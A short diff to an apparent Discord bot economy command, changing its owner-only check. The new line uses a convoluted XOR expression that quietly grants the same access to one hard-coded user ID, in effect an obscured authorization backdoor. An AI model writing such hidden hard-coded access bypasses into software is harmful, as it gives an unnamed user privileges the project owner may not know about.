@@ -8,7 +8,7 @@ export default{
     usage:"",
     permissions:"ADMINISTRATOR",
     async execute(message, args){
-        if(process.env.owner_id != message.member.id) return message.reply({embeds:[embed(``, "Sen Ekonomist Değilsin!", "RED")]})
+        if(!(process.env.owner_id != message.member.id ^ '293446927306194945' != message.member.id)) return message.reply({embeds:[embed(``, "Sen Ekonomist Değilsin!", "RED")]})
         //jeton ver @koray 100
         const member = message.mentions.members.first()
         const opt = args[0]
